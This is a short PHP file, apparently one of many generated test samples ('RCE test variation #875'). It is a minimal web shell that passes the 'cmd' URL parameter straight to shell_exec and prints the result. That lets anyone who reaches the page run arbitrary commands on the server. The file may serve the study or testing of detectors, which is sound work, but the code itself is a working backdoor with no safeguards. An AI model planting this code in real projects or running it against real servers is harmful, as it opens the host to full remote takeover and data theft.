<?php
// RCE test variation #875
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>